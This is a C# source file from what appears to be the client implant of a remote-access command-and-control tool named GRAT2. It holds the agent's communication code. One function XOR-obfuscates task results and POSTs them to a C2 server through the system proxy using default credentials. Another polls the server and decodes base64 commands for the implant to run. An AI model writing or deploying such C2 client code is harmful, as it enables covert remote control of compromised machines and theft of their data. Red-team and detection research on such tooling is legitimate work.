using System;
using System.Text;
using System.Net;
using System.IO;

namespace GRAT2_Client.PInvoke
{
    class Client
    {
        public static string PostResults(string results, string c2, string agentName)
        {
            // https://docs.microsoft.com/en-us/dotnet/framework/network-programming/how-to-send-data-using-the-webrequest-class

            //string postData = "data=" + agentName + results;
            string postData = agentName + results;
            string encrypted = Encryption.xor(postData);
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(c2);
            request.Proxy = WebRequest.GetSystemWebProxy();
            request.Proxy.Credentials = CredentialCache.DefaultCredentials;
            request.Method = "POST";
            byte[] byteArray = Encoding.UTF8.GetBytes("data=" + encrypted);
            request.ContentType = "application/x-www-form-urlencoded";
            request.UserAgent = Config.UserAgent;
            //request.Headers.Add("User-Agent", Config.UserAgent); // working only on .Net Core 3.1
            request.ContentLength = byteArray.Length;
            Stream dataStream = request.GetRequestStream();
            dataStream.Write(byteArray, 0, byteArray.Length);
            dataStream.Close();
            WebResponse response = request.GetResponse();
            using (dataStream = response.GetResponseStream())
            {
                StreamReader reader = new StreamReader(dataStream);
                string responseFromServer = reader.ReadToEnd();

            }
            response.Close();
            return postData;

        }

        public static string GetRequest(string checker_url, string agentName)
        {
            // https://docs.microsoft.com/en-us/dotnet/framework/network-programming/how-to-request-data-using-the-webrequest-class
            string agentName_encrypt = Encryption.xor(agentName);
            WebClient client = new WebClient();
            client.Proxy = WebRequest.GetSystemWebProxy();
            client.Proxy.Credentials = CredentialCache.DefaultCredentials;
            client.Headers.Add("User-Agent", Config.UserAgent);
            Stream stream = client.OpenRead(checker_url + agentName_encrypt);
            StreamReader reader = new StreamReader(stream);
            String request = reader.ReadToEnd();
            // Read Tasks from server response
            string[] server_Task = request.Split('\n');
            string decode_command = Encryption.base64_Decode(server_Task[8].Substring(6));
            //return server_Task[8].Substring(6);
            return decode_command;

        }

    }
}